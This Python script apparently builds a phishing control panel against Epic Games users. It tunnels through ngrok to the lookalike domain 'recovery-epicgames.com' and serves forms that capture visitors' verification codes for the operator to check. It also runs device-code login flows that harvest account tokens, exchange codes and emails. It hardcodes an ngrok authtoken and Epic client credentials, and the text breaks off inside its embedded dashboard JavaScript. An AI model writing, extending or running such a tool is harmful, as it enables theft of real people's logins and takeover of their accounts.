import webbrowser
import http.server
import socketserver
import threading
import urllib.parse
import json
from datetime import datetime
import uuid
import time
import socket
import subprocess
import os
import signal
import sys
import re
import asyncio
import aiohttp

# NOTE: 'undetected_chromedriver' has been removed as it's no longer needed.


class ControlPanelHandler(http.server.SimpleHTTPRequestHandler):
    # Shared data between handler instances
    captured_codes = []
    active_forms = {}  # Store active form sessions
    pending_verifications = {}  # Store codes awaiting verification
    epic_accounts = {}  # Store Epic accounts data
    epic_device_sessions = {}  # Store active Epic device auth sessions

    def do_POST(self):
        if self.path == '/generate-link':
            self.handle_generate_link()
        elif self.path == '/generate-epic-link':
            self.handle_generate_epic_link()
        elif self.path == '/clear-codes':
            self.handle_clear_codes()
        elif self.path == '/clear-epic-accounts':
            self.handle_clear_epic_accounts()
        elif self.path.startswith('/submit-code/'):
            self.handle_code_submission()
        elif self.path.startswith('/verify-code/'):
            self.handle_code_verification()
        # REMOVED: '/open-epic-browser/' handler is no longer needed.
        elif self.path.startswith('/regenerate-exchange/'):
            self.handle_regenerate_exchange()
        else:
            self.send_error(404)

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(control_panel_html.encode())
        elif self.path == '/api/codes':
            self.send_json_response({'codes': ControlPanelHandler.captured_codes})
        elif self.path == '/api/forms':
            self.send_json_response({'forms': list(ControlPanelHandler.active_forms.keys())})
        elif self.path == '/api/pending':
            self.send_json_response({'pending': ControlPanelHandler.pending_verifications})
        elif self.path == '/api/epic-accounts':
            self.send_json_response({'accounts': list(ControlPanelHandler.epic_accounts.values())})
        elif self.path == '/api/epic-sessions':
            sessions = {}
            for session_id, session_data in ControlPanelHandler.epic_device_sessions.items():
                sessions[session_id] = {
                    'session_id': session_id,
                    'user_code': session_data.get('user_code', ''),
                    'status': session_data.get('status', 'pending'),
                    'activation_link': session_data.get('activation_link', ''),
                    'created': session_data.get('created', ''),
                    'expires': session_data.get('expires', ''),
                    'account_id': session_data.get('account_id', '')
                }
            self.send_json_response({'sessions': list(sessions.values())})
        elif self.path.startswith('/form/'):
            self.handle_form_page()
        elif self.path.startswith('/check-verification/'):
            self.handle_check_verification()
        else:
            self.send_error(404)

    def handle_generate_link(self):
        # Generate a unique form ID
        form_id = str(uuid.uuid4())[:8]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Store the form session
        ControlPanelHandler.active_forms[form_id] = {
            'created': timestamp,
            'accessed': False,
            'codes_captured': 0
        }

        # Get the best available server URL
        server_url, tunnel_status = get_server_url()
        control_panel_port = self.server.server_address[1]

        # Create form URL based on tunnel status
        if 'tunnel' in tunnel_status.lower() and server_url and not server_url.startswith('192.168'):
            form_url = f"{server_url}/form/{form_id}"
        else:
            form_url = f"http://{server_url}:{control_panel_port}/form/{form_id}"

        self.send_json_response({
            'success': True,
            'form_id': form_id,
            'url': form_url,
            'created': timestamp,
            'tunnel_status': tunnel_status
        })

    def handle_generate_epic_link(self):
        # Generate Epic device auth session
        session_id = str(uuid.uuid4())[:8]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Start Epic device auth in background
        epic_thread = threading.Thread(
            target=self.run_epic_device_auth,
            args=(session_id, timestamp),
            daemon=True
        )
        epic_thread.start()

        self.send_json_response({
            'success': True,
            'session_id': session_id,
            'created': timestamp,
            'message': 'Epic device auth session started'
        })

    def run_epic_device_auth(self, session_id, timestamp):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self.epic_device_auth_flow(session_id, timestamp))
        except Exception as e:
            print(f"❌ Epic auth error: {e}")
            if session_id in ControlPanelHandler.epic_device_sessions:
                ControlPanelHandler.epic_device_sessions[session_id]['status'] = 'error'
                ControlPanelHandler.epic_device_sessions[session_id]['error'] = str(e)

    async def epic_device_auth_flow(self, session_id, timestamp):
        # Initialize session data
        ControlPanelHandler.epic_device_sessions[session_id] = {
            'session_id': session_id,
            'created': timestamp,
            'status': 'initializing',
            'user_code': '',
            'activation_link': '',
            'expires': '',
            'account_id': ''
        }

        async with aiohttp.ClientSession(trust_env=False) as sess:
            # Get service token
            svc = await self.get_epic_service_token(sess)
            if not svc:
                ControlPanelHandler.epic_device_sessions[session_id]['status'] = 'error'
                return

            # Start device auth
            dev = await self.start_epic_device_auth(sess, svc)
            if not dev:
                ControlPanelHandler.epic_device_sessions[session_id]['status'] = 'error'
                return

            user_code = dev["user_code"]
            device_code = dev["device_code"]
            interval = dev.get("interval", 5)
            expires_in = dev.get("expires_in", 600)

            activation_link = f"https://www.epicgames.com/id/activate?userCode={user_code}"
            expires = datetime.fromtimestamp(time.time() + expires_in).strftime("%Y-%m-%d %H:%M:%S")

            # Update session data so the user can see the link
            ControlPanelHandler.epic_device_sessions[session_id].update({
                'status': 'pending',
                'user_code': user_code,
                'device_code': device_code,
                'activation_link': activation_link,
                'expires': expires
            })

            print(f"\n{'=' * 60}")
            print(f"🎮 EPIC DEVICE AUTH STARTED!")
            print(f"{'=' * 60}")
            print(f"Session ID: {session_id}")
            print(f"User Code: {user_code}")
            print(f"Activation Link: {activation_link}")
            print(f"Expires: {expires}")
            print(f"Waiting for user to complete login in their browser...")
            print(f"{'=' * 60}\n")

            # Poll for approval in the background
            token_resp = await self.poll_for_epic_device_token(sess, device_code, interval, expires_in, session_id)
            if not token_resp:
                ControlPanelHandler.epic_device_sessions[session_id]['status'] = 'expired'
                print(f"⌛️ Epic session {session_id} expired.")
                return

            # Get exchange code
            exch = await self.get_epic_exchange_code(sess, token_resp.get("access_token", ""))
            if not exch:
                ControlPanelHandler.epic_device_sessions[session_id]['status'] = 'error'
                return

            # Get account info
            account_info = await self.get_epic_account_info(sess, token_resp.get("access_token", ""))
            account_id = account_info.get('id', f'unknown_{session_id}') if account_info else f'unknown_{session_id}'
            display_name = account_info.get('displayName', 'Unknown User') if account_info else 'Unknown User'

            # Store account
            ControlPanelHandler.epic_accounts[account_id] = {
                'id': account_id,
                'display_name': display_name,
                'email': account_info.get('email', 'Unknown') if account_info else 'Unknown',
                'created': timestamp,
                'last_login': timestamp,
                'current_exchange_code': exch,
                'session_id': session_id
            }

            # Update session
            ControlPanelHandler.epic_device_sessions[session_id].update({
                'status': 'verified',
                'account_id': account_id,
                'display_name': display_name,
                'exchange_code': exch
            })

            print(f"\n{'=' * 60}")
            print(f"✅ EPIC ACCOUNT VERIFIED!")
            print(f"{'=' * 60}")
            print(f"Account ID: {account_id}")
            print(f"Display Name: {display_name}")
            print(f"Exchange Code: {exch[:20]}...")
            print(f"{'=' * 60}\n")

    async def get_epic_service_token(self, session):
        EPIC_API_SWITCH_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
        OAUTH_TOKEN_URL = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": f"basic {EPIC_API_SWITCH_TOKEN}",
        }
        async with session.post(OAUTH_TOKEN_URL, headers=headers, data={"grant_type": "client_credentials"}) as r:
            if r.status != 200:
                return None
            js = await r.json()
            return js.get("access_token")

    async def start_epic_device_auth(self, session, access_token):
        DEVICE_AUTH_URL = "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization"
        headers = {
            "Authorization": f"bearer {access_token}",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        async with session.post(DEVICE_AUTH_URL, headers=headers) as r:
            if r.status != 200:
                return None
            js = await r.json()
            if "user_code" not in js or "device_code" not in js:
                return None
            return js

    async def poll_for_epic_device_token(self, session, device_code, interval, expires_in, session_id):
        POLL_TOKEN_URL = "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token"
        EPIC_API_SWITCH_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"

        poll_interval = max(1, int(interval or 5))
        deadline = time.time() + min(int(expires_in or 600), 600)

        while time.time() < deadline:
            await asyncio.sleep(poll_interval)
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": f"basic {EPIC_API_SWITCH_TOKEN}",
            }
            data = {"grant_type": "device_code", "device_code": device_code}
            async with session.post(POLL_TOKEN_URL, headers=headers, data=data) as r:
                try:
                    js = await r.json()
                except Exception:
                    js = {}

                if r.status == 200 and "access_token" in js:
                    return js

                if js.get("errorCode") == "errors.com.epicgames.account.oauth.authorization_pending":
                    continue

                if js.get("error") == "slow_down":
                    poll_interval = min(poll_interval + 2, 10)
                    continue

                if js.get("errorCode") in (
                        "errors.com.epicgames.not_found",
                        "errors.com.epicgames.account.oauth.expired_code",
                ):
                    return None

        return None

    async def get_epic_exchange_code(self, session, access_token):
        OAUTH_EXCHANGE_URL = "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange"
        headers = {"Authorization": f"bearer {access_token}"}
        async with session.get(OAUTH_EXCHANGE_URL, headers=headers) as r:
            if r.status != 200:
                return None
            js = await r.json()
            return js.get("code")

    async def get_epic_account_info(self, session, access_token):
        ACCOUNT_INFO_URL = "https://account-public-service-prod03.ol.epicgames.com/account/api/public/account"
        headers = {"Authorization": f"bearer {access_token}"}
        async with session.get(ACCOUNT_INFO_URL, headers=headers) as r:
            if r.status != 200:
                return None
            return await r.json()

    # REMOVED: The handle_open_epic_browser and open_epic_browser_background methods
    # are no longer necessary with the new manual workflow.

    def handle_regenerate_exchange(self):
        account_id = self.path.split('/')[-1]
        if account_id not in ControlPanelHandler.epic_accounts:
            self.send_json_response({'success': False, 'error': 'Account not found'})
            return

        # Start regeneration in background
        regen_thread = threading.Thread(
            target=self.regenerate_exchange_background,
            args=(account_id,),
            daemon=True
        )
        regen_thread.start()

        self.send_json_response({'success': True, 'message': 'Regenerating exchange code...'})

    def regenerate_exchange_background(self, account_id):
        # For this simplified version, we just start a new auth flow
        session_id = str(uuid.uuid4())[:8]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self.epic_device_auth_flow(session_id, timestamp))
        except Exception as e:
            print(f"❌ Regeneration error: {e}")

    def handle_form_page(self):
        # Extract form ID from URL
        form_id = self.path.split('/')[-1]

        if form_id not in ControlPanelHandler.active_forms:
            self.send_error(404, "Form not found")
            return

        # Mark as accessed
        ControlPanelHandler.active_forms[form_id]['accessed'] = True

        # Serve the verification form HTML
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        # Inject the form ID into the HTML
        form_html = verification_form_html.replace('FORM_ID_PLACEHOLDER', form_id)
        self.wfile.write(form_html.encode())

    def handle_code_submission(self):
        # Extract form ID from URL path
        form_id = self.path.split('/')[-1]

        if form_id not in ControlPanelHandler.active_forms:
            self.send_json_response({'status': 'error', 'message': 'Invalid form'})
            return

        # Get the submitted code
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = urllib.parse.parse_qs(post_data.decode('utf-8'))

        code = data.get('code', [''])[0]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Create unique verification ID
        verification_id = str(uuid.uuid4())[:8]

        # Store for pending verification
        ControlPanelHandler.pending_verifications[verification_id] = {
            'code': code,
            'form_id': form_id,
            'timestamp': timestamp,
            'status': 'pending'
        }

        # Store the code with form information
        code_entry = {
            'id': len(ControlPanelHandler.captured_codes) + 1,
            'code': code,
            'timestamp': timestamp,
            'form_id': form_id,
            'form_created': ControlPanelHandler.active_forms[form_id]['created'],
            'verification_id': verification_id,
            'status': 'pending'
        }
        ControlPanelHandler.captured_codes.append(code_entry)

        # Update form statistics
        ControlPanelHandler.active_forms[form_id]['codes_captured'] += 1

        print(f"\n{'=' * 60}")
        print(f"🔐 VERIFICATION CODE CAPTURED!")
        print(f"{'=' * 60}")
        print(f"Code: {code}")
        print(f"Form ID: {form_id}")
        print(f"Time: {timestamp}")
        print(f"Verification ID: {verification_id}")
        print(f"Status: PENDING VERIFICATION")
        print(f"{'=' * 60}\n")

        self.send_json_response({'status': 'success', 'verification_id': verification_id})

    def handle_code_verification(self):
        # Extract verification ID from URL path
        verification_id = self.path.split('/')[-1]

        # Get verification decision
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = urllib.parse.parse_qs(post_data.decode('utf-8'))

        is_correct = data.get('correct', ['false'])[0].lower() == 'true'

        if verification_id in ControlPanelHandler.pending_verifications:
            # Update pending verification
            ControlPanelHandler.pending_verifications[verification_id][
                'status'] = 'correct' if is_correct else 'incorrect'

            # Update the code entry in captured_codes
            for code_entry in ControlPanelHandler.captured_codes:
                if code_entry.get('verification_id') == verification_id:
                    code_entry['status'] = 'correct' if is_correct else 'incorrect'
                    break

            print(f"\n{'=' * 60}")
            print(f"✅ CODE VERIFICATION: {'CORRECT' if is_correct else 'INCORRECT'}")
            print(f"{'=' * 60}")
            print(f"Verification ID: {verification_id}")
            print(f"Code: {ControlPanelHandler.pending_verifications[verification_id]['code']}")
            print(f"Result: {'APPROVED' if is_correct else 'REJECTED'}")
            print(f"{'=' * 60}\n")

            self.send_json_response({'status': 'success'})
        else:
            self.send_json_response({'status': 'error', 'message': 'Invalid verification ID'})

    def handle_check_verification(self):
        # Extract verification ID from URL path
        verification_id = self.path.split('/')[-1]

        if verification_id in ControlPanelHandler.pending_verifications:
            verification = ControlPanelHandler.pending_verifications[verification_id]
            self.send_json_response({
                'status': verification['status'],
                'code': verification['code']
            })
        else:
            self.send_json_response({'status': 'not_found'})

    def handle_clear_codes(self):
        ControlPanelHandler.captured_codes.clear()
        ControlPanelHandler.active_forms.clear()
        ControlPanelHandler.pending_verifications.clear()
        self.send_json_response({'success': True, 'message': 'All codes and forms cleared'})

    def handle_clear_epic_accounts(self):
        ControlPanelHandler.epic_accounts.clear()
        ControlPanelHandler.epic_device_sessions.clear()
        self.send_json_response({'success': True, 'message': 'All Epic accounts cleared'})

    def send_json_response(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def log_message(self, format, *args):
        # Only log important messages
        if "POST" in str(args) and "submit-code" in str(args):
            pass  # We handle this in our custom handler
        elif "generate-link" in str(args):
            pass  # We handle this too


# NGROK TUNNEL INTEGRATION
tunnel_process = None
tunnel_url = None
tunnel_ready = False


def setup_ngrok_tunnel(port):
    """
    Setup ngrok tunnel for the given port with a custom domain.
    """
    global tunnel_process, tunnel_url, tunnel_ready

    try:
        print("🌐 Setting up ngrok with custom domain...")

        # Authenticate with your token
        auth_result = subprocess.run(['ngrok', 'authtoken', '311bOJxIqEmw6NQ7OxqAhtuOrsD_3hPuWjh98UmG5dnokyTQJ'],
                                     capture_output=True, text=True)

        if auth_result.returncode != 0 and "already has a token" not in auth_result.stderr:
            print(f"❌ Failed to authenticate ngrok token: {auth_result.stderr}")
        else:
            print("✅ Ngrok authenticated.")

        # Start ngrok tunnel with the custom domain
        ngrok_command = [
            'ngrok', 'http',
            '--domain', 'recovery-epicgames.com',
            str(port),
            '--log=stdout'
        ]
        
        tunnel_process = subprocess.Popen(
            ngrok_command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )

        print(f"⏳ Establishing ngrok tunnel with command: {' '.join(ngrok_command)}")
        start_time = time.time()
        timeout = 20

        while time.time() - start_time < timeout:
            if tunnel_process.poll() is not None:
                stdout, stderr = tunnel_process.communicate()
                print(f"❌ ngrok process ended unexpectedly: {stderr}")
                return None

            try:
                line = tunnel_process.stdout.readline()
                if not line:
                    time.sleep(0.2)
                    continue

                print(f"📡 ngrok: {line.strip()}")

                # Look for tunnel URL
                if 'url=' in line and 'https://' in line:
                    url_match = re.search(r'url=(https://[^\s]+)', line)
                    if url_match:
                        tunnel_url = url_match.group(1)
                        tunnel_ready = True
                        print(f"✅ Ngrok tunnel established: {tunnel_url}")
                        return tunnel_url

            except Exception as e:
                time.sleep(0.2)
                continue

        print("⚠️ Timeout waiting for ngrok tunnel. Check your ngrok account and domain settings.")
        return None

    except FileNotFoundError:
        print("❌ ngrok not found. Install from: https://ngrok.com/download")
        return None
    except Exception as e:
        print(f"❌ ngrok setup error: {e}")
        return None


def close_tunnel():
    """Close the active tunnel gracefully."""
    global tunnel_process, tunnel_ready
    if tunnel_process:
        try:
            tunnel_process.terminate()
            tunnel_process.wait(timeout=3)
            print("✅ Ngrok tunnel closed")
        except subprocess.TimeoutExpired:
            tunnel_process.kill()
            print("🔧 Force-closed ngrok tunnel")
        except Exception as e:
            print(f"⚠️ Error closing tunnel: {e}")
        finally:
            tunnel_ready = False


def get_server_url():
    """Get the best server URL and tunnel status."""
    global tunnel_url, tunnel_ready

    if tunnel_ready and tunnel_url:
        return tunnel_url, "Ngrok Tunnel Connected"
    else:
        local_ip = get_local_ip()
        return local_ip, "Local Network Only"


def get_local_ip():
    """Get the local IP address of this machine."""
    try:
        # Connect to a remote server to determine local IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "localhost"


def signal_handler(signum, frame):
    """Handle Ctrl+C gracefully."""
    print(f"\n🛑 Received signal {signum}, shutting down...")
    close_tunnel()
    sys.exit(0)


# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def find_free_port():
    """Find a free port to run the server on."""
    with socketserver.TCPServer(("", 0), None) as s:
        return s.server_address[1]


# HTML for the control panel, updated to remove browser automation buttons
control_panel_html = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel - Verification & Epic Games</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #000000; color: #ffffff; min-height: 100vh; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 40px; }
        .title { font-size: 36px; font-weight: 700; margin-bottom: 10px; background: linear-gradient(135deg, #ffffff, #cccccc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .subtitle { color: rgba(255, 255, 255, 0.7); font-size: 18px; }
        .tunnel-status { display: inline-flex; align-items: center; gap: 8px; background: rgba(255, 255, 255, 0.1); padding: 8px 16px; border-radius: 20px; margin-top: 10px; font-size: 14px; font-weight: 600; }
        .tunnel-status.connected { background: rgba(34, 197, 94, 0.2); color: #22c55e; }
        .tunnel-status.local { background: rgba(251, 191, 36, 0.2); color: #fbbf24; }
        .dashboard { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 30px; margin-bottom: 40px; }
        @media (max-width: 1200px) { .dashboard { grid-template-columns: 1fr 1fr; } }
        @media (max-width: 768px) { .dashboard { grid-template-columns: 1fr; } }
        .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 30px; transition: transform 0.2s ease; }
        .card:hover { transform: translateY(-5px); }
        .card-title { font-size: 22px; font-weight: 600; margin-bottom: 25px; display: flex; align-items: center; gap: 12px; }
        .btn { padding: 14px 28px; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; text-decoration: none; display: inline-flex; align-items: center; justify-content: center; gap: 10px; font-size: 16px; margin: 5px; }
        .btn-primary { background: linear-gradient(135deg, #ffffff, #cccccc); color: #000000; }
        .btn-epic { background: linear-gradient(135deg, #0078f2, #005cbf); color: white; }
        .btn-danger { background: linear-gradient(135deg, #333333, #1a1a1a); color: white; }
        .btn-generate { background: linear-gradient(135deg, #ffffff, #e0e0e0); color: #000000; font-size: 18px; padding: 16px 32px; width: 100%; margin-bottom: 10px; }
        .btn-correct { background: linear-gradient(135deg, #10b981, #059669); color: white; margin-right: 10px; }
        .btn-incorrect { background: linear-gradient(135deg, #ef4444, #dc2626); color: white; }
        .btn-small { padding: 8px 16px; font-size: 14px; }
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; text-align: center; }
        .stat-item { padding: 20px; background: rgba(255, 255, 255, 0.03); border-radius: 16px; border: 1px solid rgba(255, 255, 255, 0.1); }
        .stat-number { font-size: 32px; font-weight: 700; margin-bottom: 8px; }
        .stat-label { color: rgba(255, 255, 255, 0.7); font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
        .generated-link { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 12px; padding: 20px; margin: 20px 0; display: none; }
        .link-url { font-family: 'Monaco', 'Menlo', monospace; background: rgba(0, 0, 0, 0.5); padding: 12px 16px; border-radius: 8px; color: #ffffff; word-break: break-all; flex: 1; margin-right: 15px; }
        .copy-btn { padding: 10px 20px; background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #ffffff; cursor: pointer; }
        .sections { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin-top: 30px; }
        @media (max-width: 1200px) { .sections { grid-template-columns: 1fr; } }
        .code-item, .epic-item { background: rgba(255, 255, 255, 0.06); border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 16px; padding: 25px; margin-bottom: 20px; }
        .code-item.pending, .epic-item.pending { border-color: #fbbf24; background: rgba(251, 191, 36, 0.1); }
        .code-item.correct, .epic-item.verified { border-color: #10b981; background: rgba(16, 185, 129, 0.1); }
        .code-item.incorrect, .epic-item.expired, .epic-item.error { border-color: #ef4444; background: rgba(239, 68, 68, 0.1); }
        .code-details, .epic-details { display: flex; flex-direction: column; gap: 8px; }
        .code-value { font-size: 32px; font-weight: 700; font-family: 'Monaco', 'Menlo', monospace; letter-spacing: 4px; }
        .epic-user-code { font-size: 28px; font-weight: 700; font-family: 'Monaco', 'Menlo', monospace; color: #0078f2; letter-spacing: 2px; }
        .epic-display-name { font-size: 24px; font-weight: 600; }
        .code-meta, .epic-meta { display: flex; gap: 20px; font-size: 14px; color: rgba(255, 255, 255, 0.6); }
        .status-badge { padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; text-transform: uppercase; }
        .status-badge.pending { background: #fbbf24; color: #000; }
        .status-badge.correct, .status-badge.verified { background: #10b981; color: #fff; }
        .status-badge.incorrect, .status-badge.expired, .status-badge.error { background: #ef4444; color: #fff; }
        .verification-buttons, .epic-buttons { display: flex; gap: 10px; margin-top: 15px; flex-wrap: wrap; }
        .empty-state { text-align: center; padding: 80px 20px; color: rgba(255, 255, 255, 0.5); }
        .empty-icon { font-size: 64px; margin-bottom: 20px; }
        .toast { position: fixed; top: 20px; right: 20px; padding: 16px 24px; border-radius: 12px; color: white; font-weight: 600; z-index: 1000; animation: slideIn 0.4s ease; }
        .toast.success { background: linear-gradient(135deg, #ffffff, #cccccc); color: #000000; }
        .toast.error { background: linear-gradient(135deg, #333333, #1a1a1a); color: #ffffff; }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        .loading { opacity: 0.6; pointer-events: none; }
        .epic-activation-link { font-family: 'Monaco', 'Menlo', monospace; background: rgba(0, 120, 242, 0.2); padding: 8px 12px; border-radius: 6px; color: #0078f2; font-size: 12px; word-break: break-all; margin: 10px 0; }
        .epic-activation-link a { color: #00aaff; text-decoration: none; }
        .epic-activation-link a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="title">🔐🎮 Control Panel</h1>
            <p class="subtitle">Verification Codes & Epic Games Device Authentication</p>
            <div class="tunnel-status local" id="tunnel-status">🌐 Checking connection...</div>
        </div>
        <div class="dashboard">
            <div class="card">
                <h2 class="card-title">🔗 Verification Forms</h2>
                <button class="btn btn-generate" id="generate-btn">✨ Generate Verification Form</button>
                <div id="generated-link" class="generated-link">
                    <strong>🎯 Form Link Generated!</strong>
                    <div style="display: flex; align-items: center; margin-top: 15px;">
                        <div class="link-url" id="link-url"></div>
                        <button class="copy-btn" id="copy-btn">📋 Copy</button>
                    </div>
                </div>
            </div>
            <div class="card">
                <h2 class="card-title">🎮 Epic Games Authentication</h2>
                <button class="btn btn-generate btn-epic" id="generate-epic-btn">🎮 Generate Epic Device Code</button>
                <div style="margin-top: 20px; text-align: center;">
                    <button class="btn btn-danger btn-small" id="clear-epic-btn">🗑️ Clear Epic Accounts</button>
                </div>
            </div>
            <div class="card">
                <h2 class="card-title">📊 Live Statistics</h2>
                <div class="stats-grid">
                    <div class="stat-item"><div class="stat-number" style="color: #10b981;" id="codes-count">0</div><div class="stat-label">Codes Captured</div></div>
                    <div class="stat-item"><div class="stat-number" style="color: #3b82f6;" id="forms-count">0</div><div class="stat-label">Active Forms</div></div>
                </div>
                <div class="stats-grid" style="margin-top: 15px;">
                    <div class="stat-item"><div class="stat-number" style="color: #0078f2;" id="epic-accounts-count">0</div><div class="stat-label">Epic Accounts</div></div>
                    <div class="stat-item"><div class="stat-number" style="color: #fbbf24;" id="epic-sessions-count">0</div><div class="stat-label">Epic Sessions</div></div>
                </div>
                <div style="margin-top: 25px; text-align: center;">
                    <button class="btn btn-danger btn-small" id="clear-all-btn">🗑️ Clear Verification Data</button>
                </div>
            </div>
        </div>
        <div class="sections">
            <div class="card">
                <h2 class="card-title">📋 Live Code Feed</h2>
                <div id="codes-container"><div class="empty-state"><div class="empty-icon">📭</div><div><strong>No codes captured yet</strong></div></div></div>
            </div>
            <div class="card">
                <h2 class="card-title">🎮 Epic Games Management</h2>
                <div id="epic-container"><div class="empty-state"><div class="empty-icon">🎮</div><div><strong>No Epic accounts yet</strong></div></div></div>
            </div>
        </div>
    </div>
    <script>
        let updateInterval;
        const generateBtn = document.getElementById('generate-btn');
        const generateEpicBtn = document.getElementById('generate-epic-btn');
        const linkUrl = document.getElementById('link-url');
        const copyBtn = document.getElementById('copy-btn');
        const tunnelStatus = document.getElementById('tunnel-status');

        function showToast(message, type) {
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => { toast.remove(); }, 4000);
        }

        async function copyToClipboard(text, btn) {
            try {
                await navigator.clipboard.writeText(text);
                const originalText = btn.textContent;
                btn.textContent = '✅ Copied!';
                showToast('📋 Copied to clipboard!', 'success');
                setTimeout(() => { btn.textContent = originalText; }, 2000);
            } catch (error) { showToast('❌ Failed to copy', 'error'); }
        }

        generateBtn.addEventListener('click', async () => {
            generateBtn.classList.add('loading');
            generateBtn.textContent = '⏳ Generating...';
            try {
                const response = await fetch('/generate-link', { method: 'POST' });
                const data = await response.json();
                if (data.success) {
                    linkUrl.textContent = data.url;
                    document.getElementById('generated-link').style.display = 'block';
                    updateTunnelStatus(data.tunnel_status);
                    showToast('✅ Form link generated!', 'success');
                } else { showToast('❌ Failed to generate link', 'error'); }
            } catch (error) { showToast('❌ Error generating link', 'error'); }
            finally {
                generateBtn.classList.remove('loading');
                generateBtn.textContent = '✨ Generate Verification Form';
            }
        });

        copyBtn.addEventListener('click', () => copyToClipboard(linkUrl.textContent, copyBtn));

        generateEpicBtn.addEventListener('click', async () => {
            generateEpicBtn.classList.add('loading');
            generateEpicBtn.textContent = '⏳ Starting...';
            try {
                const response = await fetch('/generate-epic-link', { method: 'POST' });
                const data = await response.json();
                if (data.success) {
                    showToast('🎮 Epic auth session started!', 'success');
                } else { showToast(`❌ ${data.error || 'Failed to start'}`, 'error'); }
            } catch (error) { showToast('❌ Error starting Epic auth', 'error'); }
            finally {
                generateEpicBtn.classList.remove('loading');
                generateEpicBtn.textContent = '🎮 Generate Epic Device Code';
            }
        });

        document.getElementById('clear-all-btn').addEventListener('click', async () => {
            if (!confirm('🚨 Clear all verification codes and forms?')) return;
            await fetch('/clear-codes', { method: 'POST' });
            showToast('🗑️ Verification data cleared!', 'success');
        });

        document.getElementById('clear-epic-btn').addEventListener('click', async () => {
            if (!confirm('🚨 Clear all Epic accounts and sessions?')) return;
            await fetch('/clear-epic-accounts', { method: 'POST' });
            showToast('🗑️ Epic data cleared!', 'success');
        });

        function updateTunnelStatus(status) {
            if (status.includes('Tunnel')) {
                tunnelStatus.innerHTML = `🌐 ${status}`;
                tunnelStatus.className = 'tunnel-status connected';
            } else {
                tunnelStatus.innerHTML = `⚠️ ${status}`;
                tunnelStatus.className = 'tunnel-status local';
            }
        }

        function updateCodesDisplay(codes) {
            const container = document.getElementById('codes-container');
            if (codes.length === 0) {
                container.innerHTML = `<div class="empty-state"><div class="empty-icon">📭</div><div><strong>No codes captured yet</strong></div></div>`;
                return;
            }
            container.innerHTML = codes.slice().reverse().map(code => {
                const statusClass = code.status || 'pending';
                return `
                <div class="code-item ${statusClass}">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <div>
                            <div class="code-value">${code.code}</div>
                            <div class="code-meta">
                                <span>🕐 ${code.timestamp}</span>
                                <span class="status-badge ${statusClass}">${statusClass}</span>
                            </div>
                        </div>
                        <button class="copy-btn" onclick="copyToClipboard('${code.code}', this)">📋 Copy</button>
                    </div>
                    ${statusClass === 'pending' ? `
                        <div class="verification-buttons">
                            <button class="btn btn-correct btn-small" onclick="verifyCode('${code.verification_id}', true)">✅ Correct</button>
                            <button class="btn btn-incorrect btn-small" onclick="verifyCode('${code.verification_id}', false)">❌ Incorrect</button>
                        </div>
                    ` : ''}
                </div>`;
            }).join('');
        }
